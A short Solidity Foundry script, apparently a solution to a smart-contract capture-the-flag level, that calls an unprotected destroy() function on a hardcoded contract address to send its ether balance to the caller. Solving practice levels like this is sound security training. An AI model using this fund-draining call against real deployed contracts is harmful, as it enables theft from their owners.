/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Recovery is Script {
    function run() public {
        vm.startBroadcast();

        ISimpleToken(0x4b563D305D0544579321ed2d5A581cD378Eca07b).destroy(
            payable(msg.sender)
        );

        vm.stopBroadcast();
    }
}
